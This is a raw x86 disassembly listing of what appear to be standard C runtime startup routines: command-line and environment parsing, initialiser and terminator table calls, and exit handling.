  404455:	8b df                	mov    %edi,%ebx
  404457:	89 15 64 4d 41 00    	mov    %edx,0x414d64
  40445d:	50                   	push   %eax
  40445e:	e8 06 18 00 00       	call   0x405c69
  404463:	59                   	pop    %ecx
  404464:	89 7d f8             	mov    %edi,-0x8(%ebp)
  404467:	56                   	push   %esi
  404468:	e8 fc 17 00 00       	call   0x405c69
  40446d:	59                   	pop    %ecx
  40446e:	5f                   	pop    %edi
  40446f:	8b c3                	mov    %ebx,%eax
  404471:	5b                   	pop    %ebx
  404472:	5e                   	pop    %esi
  404473:	8b e5                	mov    %ebp,%esp
  404475:	5d                   	pop    %ebp
  404476:	c3                   	ret
  404477:	8b ff                	mov    %edi,%edi
  404479:	55                   	push   %ebp
  40447a:	8b ec                	mov    %esp,%ebp
  40447c:	51                   	push   %ecx
  40447d:	8b 45 14             	mov    0x14(%ebp),%eax
  404480:	53                   	push   %ebx
  404481:	8b 5d 18             	mov    0x18(%ebp),%ebx
  404484:	56                   	push   %esi
  404485:	8b 75 08             	mov    0x8(%ebp),%esi
  404488:	57                   	push   %edi
  404489:	83 23 00             	andl   $0x0,(%ebx)
  40448c:	8b 7d 10             	mov    0x10(%ebp),%edi
  40448f:	c7 00 01 00 00 00    	movl   $0x1,(%eax)
  404495:	8b 45 0c             	mov    0xc(%ebp),%eax
  404498:	85 c0                	test   %eax,%eax
  40449a:	74 08                	je     0x4044a4
  40449c:	89 38                	mov    %edi,(%eax)
  40449e:	83 c0 04             	add    $0x4,%eax
  4044a1:	89 45 0c             	mov    %eax,0xc(%ebp)
  4044a4:	32 c9                	xor    %cl,%cl
  4044a6:	88 4d ff             	mov    %cl,-0x1(%ebp)
  4044a9:	80 3e 22             	cmpb   $0x22,(%esi)
  4044ac:	75 0d                	jne    0x4044bb
  4044ae:	84 c9                	test   %cl,%cl
  4044b0:	b0 22                	mov    $0x22,%al
  4044b2:	0f 94 c1             	sete   %cl
  4044b5:	46                   	inc    %esi
  4044b6:	88 4d ff             	mov    %cl,-0x1(%ebp)
  4044b9:	eb 35                	jmp    0x4044f0
  4044bb:	ff 03                	incl   (%ebx)
  4044bd:	85 ff                	test   %edi,%edi
  4044bf:	74 05                	je     0x4044c6
  4044c1:	8a 06                	mov    (%esi),%al
  4044c3:	88 07                	mov    %al,(%edi)
  4044c5:	47                   	inc    %edi
  4044c6:	8a 06                	mov    (%esi),%al
  4044c8:	46                   	inc    %esi
  4044c9:	88 45 fe             	mov    %al,-0x2(%ebp)
  4044cc:	0f be c0             	movsbl %al,%eax
  4044cf:	50                   	push   %eax
  4044d0:	e8 e1 24 00 00       	call   0x4069b6
  4044d5:	59                   	pop    %ecx
  4044d6:	85 c0                	test   %eax,%eax
  4044d8:	74 0c                	je     0x4044e6
  4044da:	ff 03                	incl   (%ebx)
  4044dc:	85 ff                	test   %edi,%edi
  4044de:	74 05                	je     0x4044e5
  4044e0:	8a 06                	mov    (%esi),%al
  4044e2:	88 07                	mov    %al,(%edi)
  4044e4:	47                   	inc    %edi
  4044e5:	46                   	inc    %esi
  4044e6:	8a 45 fe             	mov    -0x2(%ebp),%al
  4044e9:	84 c0                	test   %al,%al
  4044eb:	74 19                	je     0x404506
  4044ed:	8a 4d ff             	mov    -0x1(%ebp),%cl
  4044f0:	84 c9                	test   %cl,%cl
  4044f2:	75 b5                	jne    0x4044a9
  4044f4:	3c 20                	cmp    $0x20,%al
  4044f6:	74 04                	je     0x4044fc
  4044f8:	3c 09                	cmp    $0x9,%al
  4044fa:	75 ad                	jne    0x4044a9
  4044fc:	85 ff                	test   %edi,%edi
  4044fe:	74 07                	je     0x404507
  404500:	c6 47 ff 00          	movb   $0x0,-0x1(%edi)
  404504:	eb 01                	jmp    0x404507
  404506:	4e                   	dec    %esi
  404507:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  40450b:	80 3e 00             	cmpb   $0x0,(%esi)
  40450e:	0f 84 c2 00 00 00    	je     0x4045d6
  404514:	8a 06                	mov    (%esi),%al
  404516:	3c 20                	cmp    $0x20,%al
  404518:	74 04                	je     0x40451e
  40451a:	3c 09                	cmp    $0x9,%al
  40451c:	75 03                	jne    0x404521
  40451e:	46                   	inc    %esi
  40451f:	eb f3                	jmp    0x404514
  404521:	80 3e 00             	cmpb   $0x0,(%esi)
  404524:	0f 84 ac 00 00 00    	je     0x4045d6
  40452a:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40452d:	85 c9                	test   %ecx,%ecx
  40452f:	74 08                	je     0x404539
  404531:	89 39                	mov    %edi,(%ecx)
  404533:	83 c1 04             	add    $0x4,%ecx
  404536:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  404539:	8b 45 14             	mov    0x14(%ebp),%eax
  40453c:	ff 00                	incl   (%eax)
  40453e:	33 d2                	xor    %edx,%edx
  404540:	42                   	inc    %edx
  404541:	33 c0                	xor    %eax,%eax
  404543:	eb 02                	jmp    0x404547
  404545:	46                   	inc    %esi
  404546:	40                   	inc    %eax
  404547:	80 3e 5c             	cmpb   $0x5c,(%esi)
  40454a:	74 f9                	je     0x404545
  40454c:	80 3e 22             	cmpb   $0x22,(%esi)
  40454f:	75 31                	jne    0x404582
  404551:	a8 01                	test   $0x1,%al
  404553:	75 1e                	jne    0x404573
  404555:	8a 4d ff             	mov    -0x1(%ebp),%cl
  404558:	84 c9                	test   %cl,%cl
  40455a:	74 0f                	je     0x40456b
  40455c:	8d 4e 01             	lea    0x1(%esi),%ecx
  40455f:	80 39 22             	cmpb   $0x22,(%ecx)
  404562:	75 04                	jne    0x404568
  404564:	8b f1                	mov    %ecx,%esi
  404566:	eb 0b                	jmp    0x404573
  404568:	8a 4d ff             	mov    -0x1(%ebp),%cl
  40456b:	33 d2                	xor    %edx,%edx
  40456d:	84 c9                	test   %cl,%cl
  40456f:	0f 94 45 ff          	sete   -0x1(%ebp)
  404573:	d1 e8                	shr    $1,%eax
  404575:	eb 0b                	jmp    0x404582
  404577:	48                   	dec    %eax
  404578:	85 ff                	test   %edi,%edi
  40457a:	74 04                	je     0x404580
  40457c:	c6 07 5c             	movb   $0x5c,(%edi)
  40457f:	47                   	inc    %edi
  404580:	ff 03                	incl   (%ebx)
  404582:	85 c0                	test   %eax,%eax
  404584:	75 f1                	jne    0x404577
  404586:	8a 06                	mov    (%esi),%al
  404588:	84 c0                	test   %al,%al
  40458a:	74 3b                	je     0x4045c7
  40458c:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  404590:	75 08                	jne    0x40459a
  404592:	3c 20                	cmp    $0x20,%al
  404594:	74 31                	je     0x4045c7
  404596:	3c 09                	cmp    $0x9,%al
  404598:	74 2d                	je     0x4045c7
  40459a:	85 d2                	test   %edx,%edx
  40459c:	74 23                	je     0x4045c1
  40459e:	85 ff                	test   %edi,%edi
  4045a0:	74 03                	je     0x4045a5
  4045a2:	88 07                	mov    %al,(%edi)
  4045a4:	47                   	inc    %edi
  4045a5:	0f be 06             	movsbl (%esi),%eax
  4045a8:	50                   	push   %eax
  4045a9:	e8 08 24 00 00       	call   0x4069b6
  4045ae:	59                   	pop    %ecx
  4045af:	85 c0                	test   %eax,%eax
  4045b1:	74 0c                	je     0x4045bf
  4045b3:	46                   	inc    %esi
  4045b4:	ff 03                	incl   (%ebx)
  4045b6:	85 ff                	test   %edi,%edi
  4045b8:	74 05                	je     0x4045bf
  4045ba:	8a 06                	mov    (%esi),%al
  4045bc:	88 07                	mov    %al,(%edi)
  4045be:	47                   	inc    %edi
  4045bf:	ff 03                	incl   (%ebx)
  4045c1:	46                   	inc    %esi
  4045c2:	e9 77 ff ff ff       	jmp    0x40453e
  4045c7:	85 ff                	test   %edi,%edi
  4045c9:	74 04                	je     0x4045cf
  4045cb:	c6 07 00             	movb   $0x0,(%edi)
  4045ce:	47                   	inc    %edi
  4045cf:	ff 03                	incl   (%ebx)
  4045d1:	e9 35 ff ff ff       	jmp    0x40450b
  4045d6:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4045d9:	5f                   	pop    %edi
  4045da:	5e                   	pop    %esi
  4045db:	5b                   	pop    %ebx
  4045dc:	85 c9                	test   %ecx,%ecx
  4045de:	74 03                	je     0x4045e3
  4045e0:	83 21 00             	andl   $0x0,(%ecx)
  4045e3:	8b 45 14             	mov    0x14(%ebp),%eax
  4045e6:	ff 00                	incl   (%eax)
  4045e8:	8b e5                	mov    %ebp,%esp
  4045ea:	5d                   	pop    %ebp
  4045eb:	c3                   	ret
  4045ec:	8b ff                	mov    %edi,%edi
  4045ee:	55                   	push   %ebp
  4045ef:	8b ec                	mov    %esp,%ebp
  4045f1:	56                   	push   %esi
  4045f2:	8b 75 08             	mov    0x8(%ebp),%esi
  4045f5:	81 fe ff ff ff 3f    	cmp    $0x3fffffff,%esi
  4045fb:	72 04                	jb     0x404601
  4045fd:	33 c0                	xor    %eax,%eax
  4045ff:	eb 3d                	jmp    0x40463e
  404601:	57                   	push   %edi
  404602:	83 cf ff             	or     $0xffffffff,%edi
  404605:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  404608:	33 d2                	xor    %edx,%edx
  40460a:	8b c7                	mov    %edi,%eax
  40460c:	f7 75 10             	divl   0x10(%ebp)
  40460f:	3b c8                	cmp    %eax,%ecx
  404611:	73 0d                	jae    0x404620
  404613:	0f af 4d 10          	imul   0x10(%ebp),%ecx
  404617:	c1 e6 02             	shl    $0x2,%esi
  40461a:	2b fe                	sub    %esi,%edi
  40461c:	3b f9                	cmp    %ecx,%edi
  40461e:	77 04                	ja     0x404624
  404620:	33 c0                	xor    %eax,%eax
  404622:	eb 19                	jmp    0x40463d
  404624:	8d 04 31             	lea    (%ecx,%esi,1),%eax
  404627:	6a 01                	push   $0x1
  404629:	50                   	push   %eax
  40462a:	e8 dd 15 00 00       	call   0x405c0c
  40462f:	6a 00                	push   $0x0
  404631:	8b f0                	mov    %eax,%esi
  404633:	e8 31 16 00 00       	call   0x405c69
  404638:	83 c4 0c             	add    $0xc,%esp
  40463b:	8b c6                	mov    %esi,%eax
  40463d:	5f                   	pop    %edi
  40463e:	5e                   	pop    %esi
  40463f:	5d                   	pop    %ebp
  404640:	c3                   	ret
  404641:	8b ff                	mov    %edi,%edi
  404643:	55                   	push   %ebp
  404644:	8b ec                	mov    %esp,%ebp
  404646:	5d                   	pop    %ebp
  404647:	e9 07 fd ff ff       	jmp    0x404353
  40464c:	83 3d f8 4c 41 00 00 	cmpl   $0x0,0x414cf8
  404653:	74 03                	je     0x404658
  404655:	33 c0                	xor    %eax,%eax
  404657:	c3                   	ret
  404658:	56                   	push   %esi
  404659:	57                   	push   %edi
  40465a:	e8 cc 1f 00 00       	call   0x40662b
  40465f:	e8 ba 23 00 00       	call   0x406a1e
  404664:	8b f0                	mov    %eax,%esi
  404666:	85 f6                	test   %esi,%esi
  404668:	75 05                	jne    0x40466f
  40466a:	83 cf ff             	or     $0xffffffff,%edi
  40466d:	eb 2a                	jmp    0x404699
  40466f:	56                   	push   %esi
  404670:	e8 30 00 00 00       	call   0x4046a5
  404675:	59                   	pop    %ecx
  404676:	85 c0                	test   %eax,%eax
  404678:	75 05                	jne    0x40467f
  40467a:	83 cf ff             	or     $0xffffffff,%edi
  40467d:	eb 12                	jmp    0x404691
  40467f:	50                   	push   %eax
  404680:	b9 f8 4c 41 00       	mov    $0x414cf8,%ecx
  404685:	a3 04 4d 41 00       	mov    %eax,0x414d04
  40468a:	e8 08 fc ff ff       	call   0x404297
  40468f:	33 ff                	xor    %edi,%edi
  404691:	6a 00                	push   $0x0
  404693:	e8 d1 15 00 00       	call   0x405c69
  404698:	59                   	pop    %ecx
  404699:	56                   	push   %esi
  40469a:	e8 ca 15 00 00       	call   0x405c69
  40469f:	59                   	pop    %ecx
  4046a0:	8b c7                	mov    %edi,%eax
  4046a2:	5f                   	pop    %edi
  4046a3:	5e                   	pop    %esi
  4046a4:	c3                   	ret
  4046a5:	8b ff                	mov    %edi,%edi
  4046a7:	55                   	push   %ebp
  4046a8:	8b ec                	mov    %esp,%ebp
  4046aa:	51                   	push   %ecx
  4046ab:	51                   	push   %ecx
  4046ac:	53                   	push   %ebx
  4046ad:	56                   	push   %esi
  4046ae:	57                   	push   %edi
  4046af:	8b 7d 08             	mov    0x8(%ebp),%edi
  4046b2:	33 d2                	xor    %edx,%edx
  4046b4:	8b f7                	mov    %edi,%esi
  4046b6:	8a 07                	mov    (%edi),%al
  4046b8:	eb 18                	jmp    0x4046d2
  4046ba:	3c 3d                	cmp    $0x3d,%al
  4046bc:	74 01                	je     0x4046bf
  4046be:	42                   	inc    %edx
  4046bf:	8b ce                	mov    %esi,%ecx
  4046c1:	8d 59 01             	lea    0x1(%ecx),%ebx
  4046c4:	8a 01                	mov    (%ecx),%al
  4046c6:	41                   	inc    %ecx
  4046c7:	84 c0                	test   %al,%al
  4046c9:	75 f9                	jne    0x4046c4
  4046cb:	2b cb                	sub    %ebx,%ecx
  4046cd:	46                   	inc    %esi
  4046ce:	03 f1                	add    %ecx,%esi
  4046d0:	8a 06                	mov    (%esi),%al
  4046d2:	84 c0                	test   %al,%al
  4046d4:	75 e4                	jne    0x4046ba
  4046d6:	8d 42 01             	lea    0x1(%edx),%eax
  4046d9:	6a 04                	push   $0x4
  4046db:	50                   	push   %eax
  4046dc:	e8 2b 15 00 00       	call   0x405c0c
  4046e1:	8b d8                	mov    %eax,%ebx
  4046e3:	59                   	pop    %ecx
  4046e4:	59                   	pop    %ecx
  4046e5:	85 db                	test   %ebx,%ebx
  4046e7:	74 6d                	je     0x404756
  4046e9:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4046ec:	eb 52                	jmp    0x404740
  4046ee:	8b cf                	mov    %edi,%ecx
  4046f0:	8d 51 01             	lea    0x1(%ecx),%edx
  4046f3:	8a 01                	mov    (%ecx),%al
  4046f5:	41                   	inc    %ecx
  4046f6:	84 c0                	test   %al,%al
  4046f8:	75 f9                	jne    0x4046f3
  4046fa:	2b ca                	sub    %edx,%ecx
  4046fc:	80 3f 3d             	cmpb   $0x3d,(%edi)
  4046ff:	8d 41 01             	lea    0x1(%ecx),%eax
  404702:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404705:	74 37                	je     0x40473e
  404707:	6a 01                	push   $0x1
  404709:	50                   	push   %eax
  40470a:	e8 fd 14 00 00       	call   0x405c0c
  40470f:	8b f0                	mov    %eax,%esi
  404711:	59                   	pop    %ecx
  404712:	59                   	pop    %ecx
  404713:	85 f6                	test   %esi,%esi
  404715:	74 30                	je     0x404747
  404717:	57                   	push   %edi
  404718:	ff 75 f8             	push   -0x8(%ebp)
  40471b:	56                   	push   %esi
  40471c:	e8 f7 0b 00 00       	call   0x405318
  404721:	83 c4 0c             	add    $0xc,%esp
  404724:	85 c0                	test   %eax,%eax
  404726:	75 41                	jne    0x404769
  404728:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40472b:	6a 00                	push   $0x0
  40472d:	89 30                	mov    %esi,(%eax)
  40472f:	83 c0 04             	add    $0x4,%eax
  404732:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404735:	e8 2f 15 00 00       	call   0x405c69
  40473a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40473d:	59                   	pop    %ecx
  40473e:	03 f8                	add    %eax,%edi
  404740:	80 3f 00             	cmpb   $0x0,(%edi)
  404743:	75 a9                	jne    0x4046ee
  404745:	eb 11                	jmp    0x404758
  404747:	53                   	push   %ebx
  404748:	e8 29 00 00 00       	call   0x404776
  40474d:	6a 00                	push   $0x0
  40474f:	e8 15 15 00 00       	call   0x405c69
  404754:	59                   	pop    %ecx
  404755:	59                   	pop    %ecx
  404756:	33 db                	xor    %ebx,%ebx
  404758:	6a 00                	push   $0x0
  40475a:	e8 0a 15 00 00       	call   0x405c69
  40475f:	59                   	pop    %ecx
  404760:	5f                   	pop    %edi
  404761:	5e                   	pop    %esi
  404762:	8b c3                	mov    %ebx,%eax
  404764:	5b                   	pop    %ebx
  404765:	8b e5                	mov    %ebp,%esp
  404767:	5d                   	pop    %ebp
  404768:	c3                   	ret
  404769:	33 c0                	xor    %eax,%eax
  40476b:	50                   	push   %eax
  40476c:	50                   	push   %eax
  40476d:	50                   	push   %eax
  40476e:	50                   	push   %eax
  40476f:	50                   	push   %eax
  404770:	e8 d8 13 00 00       	call   0x405b4d
  404775:	cc                   	int3
  404776:	8b ff                	mov    %edi,%edi
  404778:	55                   	push   %ebp
  404779:	8b ec                	mov    %esp,%ebp
  40477b:	56                   	push   %esi
  40477c:	8b 75 08             	mov    0x8(%ebp),%esi
  40477f:	85 f6                	test   %esi,%esi
  404781:	74 1f                	je     0x4047a2
  404783:	8b 06                	mov    (%esi),%eax
  404785:	57                   	push   %edi
  404786:	8b fe                	mov    %esi,%edi
  404788:	eb 0c                	jmp    0x404796
  40478a:	50                   	push   %eax
  40478b:	e8 d9 14 00 00       	call   0x405c69
  404790:	8d 7f 04             	lea    0x4(%edi),%edi
  404793:	8b 07                	mov    (%edi),%eax
  404795:	59                   	pop    %ecx
  404796:	85 c0                	test   %eax,%eax
  404798:	75 f0                	jne    0x40478a
  40479a:	56                   	push   %esi
  40479b:	e8 c9 14 00 00       	call   0x405c69
  4047a0:	59                   	pop    %ecx
  4047a1:	5f                   	pop    %edi
  4047a2:	5e                   	pop    %esi
  4047a3:	5d                   	pop    %ebp
  4047a4:	c3                   	ret
  4047a5:	8b ff                	mov    %edi,%edi
  4047a7:	55                   	push   %ebp
  4047a8:	8b ec                	mov    %esp,%ebp
  4047aa:	51                   	push   %ecx
  4047ab:	a1 00 40 41 00       	mov    0x414000,%eax
  4047b0:	33 c5                	xor    %ebp,%eax
  4047b2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4047b5:	56                   	push   %esi
  4047b6:	8b f1                	mov    %ecx,%esi
  4047b8:	57                   	push   %edi
  4047b9:	8d 7e 04             	lea    0x4(%esi),%edi
  4047bc:	eb 11                	jmp    0x4047cf
  4047be:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4047c1:	56                   	push   %esi
  4047c2:	ff 15 3c d1 40 00    	call   *0x40d13c
  4047c8:	ff 55 08             	call   *0x8(%ebp)
  4047cb:	59                   	pop    %ecx
  4047cc:	83 c6 04             	add    $0x4,%esi
  4047cf:	3b f7                	cmp    %edi,%esi
  4047d1:	75 eb                	jne    0x4047be
  4047d3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4047d6:	5f                   	pop    %edi
  4047d7:	33 cd                	xor    %ebp,%ecx
  4047d9:	5e                   	pop    %esi
  4047da:	e8 7f ca ff ff       	call   0x40125e
  4047df:	8b e5                	mov    %ebp,%esp
  4047e1:	5d                   	pop    %ebp
  4047e2:	c2 04 00             	ret    $0x4
  4047e5:	8b ff                	mov    %edi,%edi
  4047e7:	55                   	push   %ebp
  4047e8:	8b ec                	mov    %esp,%ebp
  4047ea:	8b 45 08             	mov    0x8(%ebp),%eax
  4047ed:	8b 00                	mov    (%eax),%eax
  4047ef:	3b 05 04 4d 41 00    	cmp    0x414d04,%eax
  4047f5:	74 07                	je     0x4047fe
  4047f7:	50                   	push   %eax
  4047f8:	e8 79 ff ff ff       	call   0x404776
  4047fd:	59                   	pop    %ecx
  4047fe:	5d                   	pop    %ebp
  4047ff:	c3                   	ret
  404800:	8b ff                	mov    %edi,%edi
  404802:	55                   	push   %ebp
  404803:	8b ec                	mov    %esp,%ebp
  404805:	8b 45 08             	mov    0x8(%ebp),%eax
  404808:	8b 00                	mov    (%eax),%eax
  40480a:	3b 05 00 4d 41 00    	cmp    0x414d00,%eax
  404810:	74 07                	je     0x404819
  404812:	50                   	push   %eax
  404813:	e8 5e ff ff ff       	call   0x404776
  404818:	59                   	pop    %ecx
  404819:	5d                   	pop    %ebp
  40481a:	c3                   	ret
  40481b:	68 e5 47 40 00       	push   $0x4047e5
  404820:	b9 f8 4c 41 00       	mov    $0x414cf8,%ecx
  404825:	e8 7b ff ff ff       	call   0x4047a5
  40482a:	68 00 48 40 00       	push   $0x404800
  40482f:	b9 fc 4c 41 00       	mov    $0x414cfc,%ecx
  404834:	e8 6c ff ff ff       	call   0x4047a5
  404839:	ff 35 04 4d 41 00    	push   0x414d04
  40483f:	e8 32 ff ff ff       	call   0x404776
  404844:	ff 35 00 4d 41 00    	push   0x414d00
  40484a:	e8 27 ff ff ff       	call   0x404776
  40484f:	59                   	pop    %ecx
  404850:	59                   	pop    %ecx
  404851:	c3                   	ret
  404852:	e9 f5 fd ff ff       	jmp    0x40464c
  404857:	8b ff                	mov    %edi,%edi
  404859:	53                   	push   %ebx
  40485a:	56                   	push   %esi
  40485b:	e8 cb 1d 00 00       	call   0x40662b
  404860:	8b 35 6c 4d 41 00    	mov    0x414d6c,%esi
  404866:	85 f6                	test   %esi,%esi
  404868:	75 05                	jne    0x40486f
  40486a:	be 08 4d 41 00       	mov    $0x414d08,%esi
  40486f:	32 db                	xor    %bl,%bl
  404871:	8a 06                	mov    (%esi),%al
  404873:	3c 20                	cmp    $0x20,%al
  404875:	7f 08                	jg     0x40487f
  404877:	84 c0                	test   %al,%al
  404879:	74 2a                	je     0x4048a5
  40487b:	84 db                	test   %bl,%bl
  40487d:	74 20                	je     0x40489f
  40487f:	3c 22                	cmp    $0x22,%al
  404881:	75 05                	jne    0x404888
  404883:	84 db                	test   %bl,%bl
  404885:	0f 94 c3             	sete   %bl
  404888:	0f be c0             	movsbl %al,%eax
  40488b:	50                   	push   %eax
  40488c:	e8 25 21 00 00       	call   0x4069b6
  404891:	59                   	pop    %ecx
  404892:	85 c0                	test   %eax,%eax
  404894:	74 01                	je     0x404897
  404896:	46                   	inc    %esi
  404897:	46                   	inc    %esi
  404898:	eb d7                	jmp    0x404871
  40489a:	3c 20                	cmp    $0x20,%al
  40489c:	7f 07                	jg     0x4048a5
  40489e:	46                   	inc    %esi
  40489f:	8a 06                	mov    (%esi),%al
  4048a1:	84 c0                	test   %al,%al
  4048a3:	75 f5                	jne    0x40489a
  4048a5:	8b c6                	mov    %esi,%eax
  4048a7:	5e                   	pop    %esi
  4048a8:	5b                   	pop    %ebx
  4048a9:	c3                   	ret
  4048aa:	8b ff                	mov    %edi,%edi
  4048ac:	55                   	push   %ebp
  4048ad:	8b ec                	mov    %esp,%ebp
  4048af:	51                   	push   %ecx
  4048b0:	51                   	push   %ecx
  4048b1:	a1 00 40 41 00       	mov    0x414000,%eax
  4048b6:	33 c5                	xor    %ebp,%eax
  4048b8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4048bb:	8b 45 0c             	mov    0xc(%ebp),%eax
  4048be:	53                   	push   %ebx
  4048bf:	56                   	push   %esi
  4048c0:	8b 75 08             	mov    0x8(%ebp),%esi
  4048c3:	2b c6                	sub    %esi,%eax
  4048c5:	83 c0 03             	add    $0x3,%eax
  4048c8:	57                   	push   %edi
  4048c9:	33 ff                	xor    %edi,%edi
  4048cb:	c1 e8 02             	shr    $0x2,%eax
  4048ce:	39 75 0c             	cmp    %esi,0xc(%ebp)
  4048d1:	1b db                	sbb    %ebx,%ebx
  4048d3:	f7 d3                	not    %ebx
  4048d5:	23 d8                	and    %eax,%ebx
  4048d7:	74 1c                	je     0x4048f5
  4048d9:	8b 06                	mov    (%esi),%eax
  4048db:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4048de:	85 c0                	test   %eax,%eax
  4048e0:	74 0b                	je     0x4048ed
  4048e2:	8b c8                	mov    %eax,%ecx
  4048e4:	ff 15 3c d1 40 00    	call   *0x40d13c
  4048ea:	ff 55 f8             	call   *-0x8(%ebp)
  4048ed:	83 c6 04             	add    $0x4,%esi
  4048f0:	47                   	inc    %edi
  4048f1:	3b fb                	cmp    %ebx,%edi
  4048f3:	75 e4                	jne    0x4048d9
  4048f5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4048f8:	5f                   	pop    %edi
  4048f9:	5e                   	pop    %esi
  4048fa:	33 cd                	xor    %ebp,%ecx
  4048fc:	5b                   	pop    %ebx
  4048fd:	e8 5c c9 ff ff       	call   0x40125e
  404902:	8b e5                	mov    %ebp,%esp
  404904:	5d                   	pop    %ebp
  404905:	c3                   	ret
  404906:	8b ff                	mov    %edi,%edi
  404908:	55                   	push   %ebp
  404909:	8b ec                	mov    %esp,%ebp
  40490b:	51                   	push   %ecx
  40490c:	a1 00 40 41 00       	mov    0x414000,%eax
  404911:	33 c5                	xor    %ebp,%eax
  404913:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404916:	56                   	push   %esi
  404917:	8b 75 08             	mov    0x8(%ebp),%esi
  40491a:	57                   	push   %edi
  40491b:	eb 17                	jmp    0x404934
  40491d:	8b 3e                	mov    (%esi),%edi
  40491f:	85 ff                	test   %edi,%edi
  404921:	74 0e                	je     0x404931
  404923:	8b cf                	mov    %edi,%ecx
  404925:	ff 15 3c d1 40 00    	call   *0x40d13c
  40492b:	ff d7                	call   *%edi
  40492d:	85 c0                	test   %eax,%eax
  40492f:	75 0a                	jne    0x40493b
  404931:	83 c6 04             	add    $0x4,%esi
  404934:	3b 75 0c             	cmp    0xc(%ebp),%esi
  404937:	75 e4                	jne    0x40491d
  404939:	33 c0                	xor    %eax,%eax
  40493b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40493e:	5f                   	pop    %edi
  40493f:	33 cd                	xor    %ebp,%ecx
  404941:	5e                   	pop    %esi
  404942:	e8 17 c9 ff ff       	call   0x40125e
  404947:	8b e5                	mov    %ebp,%esp
  404949:	5d                   	pop    %ebp
  40494a:	c3                   	ret
  40494b:	8b ff                	mov    %edi,%edi
  40494d:	55                   	push   %ebp
  40494e:	8b ec                	mov    %esp,%ebp
  404950:	33 c0                	xor    %eax,%eax
  404952:	81 7d 08 63 73 6d e0 	cmpl   $0xe06d7363,0x8(%ebp)
  404959:	0f 94 c0             	sete   %al
  40495c:	5d                   	pop    %ebp
  40495d:	c3                   	ret
  40495e:	6a 0c                	push   $0xc
  404960:	68 98 26 41 00       	push   $0x412698
  404965:	e8 b6 76 00 00       	call   0x40c020
  40496a:	8b 75 10             	mov    0x10(%ebp),%esi
  40496d:	85 f6                	test   %esi,%esi
  40496f:	75 12                	jne    0x404983
  404971:	e8 42 01 00 00       	call   0x404ab8
  404976:	84 c0                	test   %al,%al
  404978:	74 09                	je     0x404983
  40497a:	ff 75 08             	push   0x8(%ebp)
  40497d:	e8 7a 01 00 00       	call   0x404afc
  404982:	59                   	pop    %ecx
  404983:	6a 02                	push   $0x2
  404985:	e8 58 21 00 00       	call   0x406ae2
  40498a:	59                   	pop    %ecx
  40498b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40498f:	80 3d 14 4d 41 00 00 	cmpb   $0x0,0x414d14
  404996:	0f 85 99 00 00 00    	jne    0x404a35
  40499c:	33 c0                	xor    %eax,%eax
  40499e:	40                   	inc    %eax
  40499f:	b9 0c 4d 41 00       	mov    $0x414d0c,%ecx
  4049a4:	87 01                	xchg   %eax,(%ecx)
  4049a6:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4049ad:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4049b0:	85 ff                	test   %edi,%edi
  4049b2:	75 3c                	jne    0x4049f0
  4049b4:	8b 1d 00 40 41 00    	mov    0x414000,%ebx
  4049ba:	8b d3                	mov    %ebx,%edx
  4049bc:	83 e2 1f             	and    $0x1f,%edx
  4049bf:	6a 20                	push   $0x20
  4049c1:	59                   	pop    %ecx
  4049c2:	2b ca                	sub    %edx,%ecx
  4049c4:	33 c0                	xor    %eax,%eax
  4049c6:	d3 c8                	ror    %cl,%eax
  4049c8:	33 c3                	xor    %ebx,%eax
  4049ca:	8b 0d 10 4d 41 00    	mov    0x414d10,%ecx
  4049d0:	3b c8                	cmp    %eax,%ecx
  4049d2:	74 15                	je     0x4049e9
  4049d4:	33 d9                	xor    %ecx,%ebx
  4049d6:	33 c0                	xor    %eax,%eax
  4049d8:	50                   	push   %eax
  4049d9:	50                   	push   %eax
  4049da:	50                   	push   %eax
  4049db:	8b ca                	mov    %edx,%ecx
  4049dd:	d3 cb                	ror    %cl,%ebx
  4049df:	8b cb                	mov    %ebx,%ecx
  4049e1:	ff 15 3c d1 40 00    	call   *0x40d13c
  4049e7:	ff d3                	call   *%ebx
  4049e9:	68 24 4d 41 00       	push   $0x414d24
  4049ee:	eb 0a                	jmp    0x4049fa
  4049f0:	83 ff 01             	cmp    $0x1,%edi
  4049f3:	75 0b                	jne    0x404a00
  4049f5:	68 30 4d 41 00       	push   $0x414d30
  4049fa:	e8 98 06 00 00       	call   0x405097
  4049ff:	59                   	pop    %ecx
  404a00:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404a04:	85 ff                	test   %edi,%edi
  404a06:	75 11                	jne    0x404a19
  404a08:	68 7c d1 40 00       	push   $0x40d17c
  404a0d:	68 6c d1 40 00       	push   $0x40d16c
  404a12:	e8 93 fe ff ff       	call   0x4048aa
  404a17:	59                   	pop    %ecx
  404a18:	59                   	pop    %ecx
  404a19:	68 84 d1 40 00       	push   $0x40d184
  404a1e:	68 80 d1 40 00       	push   $0x40d180
  404a23:	e8 82 fe ff ff       	call   0x4048aa
  404a28:	59                   	pop    %ecx
  404a29:	59                   	pop    %ecx
  404a2a:	85 f6                	test   %esi,%esi
  404a2c:	75 07                	jne    0x404a35
  404a2e:	c6 05 14 4d 41 00 01 	movb   $0x1,0x414d14
  404a35:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404a3c:	e8 27 00 00 00       	call   0x404a68
  404a41:	85 f6                	test   %esi,%esi
  404a43:	75 2c                	jne    0x404a71
  404a45:	ff 75 08             	push   0x8(%ebp)
  404a48:	e8 2a 00 00 00       	call   0x404a77
